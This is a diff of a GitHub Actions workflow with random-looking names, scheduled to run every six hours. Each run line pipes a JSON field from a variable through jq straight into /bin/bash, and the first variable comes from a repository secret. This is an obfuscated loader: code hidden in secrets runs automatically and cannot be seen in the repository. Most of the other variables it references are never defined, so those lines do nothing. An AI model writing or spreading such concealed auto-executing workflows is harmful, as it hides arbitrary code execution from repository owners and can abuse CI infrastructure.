@@ -1,33 +1,23 @@
 name: yuetudi7651
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '22 4/6 * * *'
 
-jobs:  # 22633
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuetudi7651
         env:
-          lipeb9701: ${{ secrets.lipeb9701 }}
+          qkeom567: ${{ secrets.qkeom567 }}
         run: |
-          echo $lipeb9701 | jq -r .jbho27 | /bin/bash
-          echo $lfugq22 | jq -r .vbjw8002 | /bin/bash
-          echo $rghth1 | jq -r .ag263 | /bin/bash
-          echo $m9 | jq -r .vpvy53289 | /bin/bash
-          echo $co14 | jq -r .b9342 | /bin/bash
-          echo $pxd9 | jq -r .jjm14 | /bin/bash
-          echo $rdjq4 | jq -r .qmj64284 | /bin/bash
-          echo $cgee05200 | jq -r .hpg0630 | /bin/bash
-          echo $w407 | jq -r .jrfcn3482 | /bin/bash
-          echo $f3 | jq -r .tbost327 | /bin/bash
-          echo $u836 | jq -r .njm40 | /bin/bash
-          echo $cn1 | jq -r .cua85 | /bin/bash
-          echo $nxe30041 | jq -r .nlbav947 | /bin/bash
-          echo $clubz1 | jq -r .ti8 | /bin/bash
-          echo $tzmm931 | jq -r .x4190 | /bin/bash
-          echo $rb5 | jq -r .drhhn092 | /bin/bash
+          echo $qkeom567 | jq -r .zfaq2 | /bin/bash
+          echo $h00683 | jq -r .kqpjt37 | /bin/bash
+          echo $qo4068 | jq -r .y6 | /bin/bash
+          echo $g32424 | jq -r .s244 | /bin/bash
+          echo $muswb179 | jq -r .ils535 | /bin/bash
+          echo $l2 | jq -r .kqd7200 | /bin/bash
+          echo $rz01614 | jq -r .s71 | /bin/bash
 
